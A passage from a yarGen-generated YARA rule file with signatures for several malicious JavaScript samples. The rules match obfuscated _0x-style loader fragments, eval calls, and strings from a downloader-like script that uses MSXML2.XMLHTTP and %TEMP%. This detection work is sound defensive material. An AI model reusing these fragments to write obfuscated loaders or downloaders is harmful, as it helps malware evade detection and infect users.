      uint16(0) == 0x7274 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_9140fd537bf5f86928a95b306d11831a8e59717206767aae991c8331ebcf7bb2 {
   meta:
      description = "JS - file 9140fd537bf5f86928a95b306d11831a8e59717206767aae991c8331ebcf7bb2.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "9140fd537bf5f86928a95b306d11831a8e59717206767aae991c8331ebcf7bb2"
   strings:
      $s1 = ",_0x434463,_0x55a079){return _0x3756(_0x434463- -'0x176',_0x55a079);}JAeUEDglFuMwCbOIx=_0x47b9b1(AZMisUTXEvtponxKVad, _0x291a59(" ascii
      $s2 = "var _0x477d=['DuUOk','vBuUO','kvruU','OkvKu','UOkvj','uUOkv','mVuUO', 'kvxuU','Okvuu','UOkvR','MuUOk','vaiuU','OkvSu','UOkvN','v" ascii
      $s3 = "',-'0x111',-'0x173',-'0x156',-'0x103')+_0x23f369(-'0x271', -'0x2f8',-'0x31c',-'0x2ad',-'0x251')+'aTuUO'+_0x2b976d(-'0x12d',-'0x1" ascii
      $s4 = "4){return _0x3756(_0x20efac- -'0x14e',_0x374f24);}try{setTimeout('',-0x3f3+0xc2*-0x5+0xdf*0xd);}catch(_0x5638f3){var _0x104003='" ascii
      $s5 = "6,_0x56392d,_0x29bdfa){return _0x3756(_0x56392d- -'0x2bf',_0x51add8);}eval(_0x47b9b1(RtNipXmkCrUgazM,mnjZhCJtOSIXcaokrzf));" fullword ascii
      $s6 = "bjyz', 'Vaibj','yzVSb','jyzVN','Cbjyz','V.bjy','zVShb','jyzVe','llEbj','yzVxb','cbjyz','Vutbj','yzVe(','\\x22bjyz','Vcbjy','zVmb" ascii
      $s7 = "608(-'0x12e',-'0x106', -'0x11e',-'0x176',-'0x13a')+_0x2b976d(-'0x106',-'0x10e',-'0x143',-'0xb0',-'0x177')+_0x23f369(-'0x288',-'0" ascii
      $s8 = "-'0x279',-'0x245')+_0x291a59('0x2b7','0x2d1','0x253','0x255','0x280')+_0x2b976d(-'0x149',-'0xe6', -'0x17c',-'0x169',-'0x188')+_0" ascii
      $s9 = "\\x20uUO','kv=uU','Okv\\x20n','ew\\x20Au','UOkvc','tivuU','OkveX','OuUOk','vbjec','tuUOk','v(\\x22uU','OkvsH','euUOk','vLuUO','k" ascii
      $s10 = ", -'0xb7',-'0x107',-'0x109',-'0x16b')+_0x2b976d(-'0xe0',-'0xee',-'0x126', -'0x96',-'0xf3')+_0x291a59('0x224','0x2ea', '0x236','0" ascii
      $s11 = "08(-'0x130',-'0x154',-'0xcc', -'0x129',-'0xe3')+_0xcf8beb('0x1d5','0x18c','0x186','0x197','0x145')+_0x5b4608(-'0xfc',-'0xe7',-'0" ascii
      $s12 = "xa4',-'0x6d', -'0xe5',-'0x33',-'0x38')+_0xcf8beb('0x1d9','0x1a9','0x1e6','0x19b','0x1f2')+_0x23f369(-'0x1d4',-'0x1c1',-'0x282',-" ascii
      $s13 = "-'0xce',-'0xd9',-'0x55', -'0xef',-'0x11a')+_0x291a59('0x257','0x307','0x29a','0x2c8','0x2cc')+_0xcf8beb('0x1cb','0x190','0x206'," ascii
      $s14 = "',-'0x98', -'0xc6',-'0xa4')+_0x291a59('0x2d5','0x2fb','0x355','0x2c1','0x2f1')+_0x23f369(-'0x1ce',-'0x21d',-'0x1d2', -'0x1dc',-'" ascii
      $s15 = "+_0x5b4608(-'0xc1',-'0x9d',-'0x5f', -'0xad',-'0x7e')+_0x2b976d(-'0x84',-'0x95',-'0x2e',-'0xaa',-'0xd7')+_0x2b976d(-'0x83',-'0x7d" ascii
      $s16 = "', -'0x6b',-'0x38',-'0x92')+_0x291a59('0x27f','0x24a','0x238','0x2e6','0x29d')+_0x291a59('0x2ff','0x295','0x329','0x316','0x2e6'" ascii
      $s17 = "x2b976d(-'0xa6', -'0xcd', -'0x80',-'0xeb',-'0x72')+_0x23f369(-'0x228',-'0x1c5',-'0x220', -'0x233',-'0x230')+_0x2b976d(-'0xbc',-'" ascii
      $s18 = "-'0x5d',-'0x37')+_0x2b976d(-'0xb0',-'0xe2', -'0xf0',-'0x65',-'0x52')+_0x291a59('0x32e','0x2ae','0x2e2','0x2d6','0x2ea')+_0x291a5" ascii
      $s19 = "x5b4608(-'0xd0',-'0xfe', -'0xef',-'0xe4',-'0x7e')+_0x291a59('0x2e1','0x2c4','0x36f','0x326','0x312')+_0x291a59('0x2ed','0x2de','" ascii
      $s20 = "x176')+_0x23f369(-'0x21f',-'0x266',-'0x287',-'0x292', -'0x25d')+_0x23f369(-'0x2e0',-'0x23c', -'0x253',-'0x291',-'0x2c4')+_0xcf8b" ascii
   condition:
      uint16(0) == 0x6176 and filesize < 60KB and
      8 of them
}

rule sig_0648670d390d0fbf8d8481d6c269e1196140fc57c1535c2818ea9ddca07d61f0 {
   meta:
      description = "JS - file 0648670d390d0fbf8d8481d6c269e1196140fc57c1535c2818ea9ddca07d61f0.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "0648670d390d0fbf8d8481d6c269e1196140fc57c1535c2818ea9ddca07d61f0"
   strings:
      $s1 = "//Coded By Pjoao1578" fullword wide
      $s2 = "%TEMP%!...........!'" fullword wide
      $s3 = "MSXML2.XMLHTTP!...........!'" fullword wide
      $s4 = "var wdffBMdpwu;" fullword wide
      $s5 = "wdffBMdpwu = [\"\"," fullword wide
      $s6 = "\"\"].join(\"\\n\");" fullword wide
      $s7 = "var _0xa7e8=[\"\",\"\\x6A\\x6F\\x69\\x6E\",\"\\u2193\\u2192\\u21A8\\u2191\\u221F\\u2022\\u2194\\u221F\",\"\\x73\\x70\\x6C\\x69" wide
      $s8 = "eval(wdffBMdpwu);" fullword wide
      $s9 = "(0);\"," fullword wide
      $s10 = "GET!...........!'" fullword wide
      $s11 = ", 2)\"," fullword wide
   condition:
      uint16(0) == 0xfeff and filesize < 50KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

